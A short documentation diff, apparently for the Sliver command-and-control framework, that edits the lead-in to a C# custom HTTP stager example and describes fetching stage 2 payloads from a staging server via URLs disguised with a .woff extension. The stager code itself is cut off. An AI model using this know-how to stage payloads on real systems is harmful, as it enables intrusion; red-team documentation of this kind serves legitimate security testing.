@@ -69,7 +69,7 @@ The file extension used to retrieve a stage 2 payload is `.woff`.
 
 As a result, if you want to implement your own stager to fetch a stage 2 payload via HTTP, you need to query a URL that looks like this: `http://SLIVER-SERVER:STAGING-PORT/whatever.woff`.
 
-Here is a C# example of a custom HTTP stager:
+Here is a C# example of a custom HTTP stager, make sure to compile the C# code for the correct CPU architecture e.g. `/platform:x64`:
 
 ```csharp
 using System;
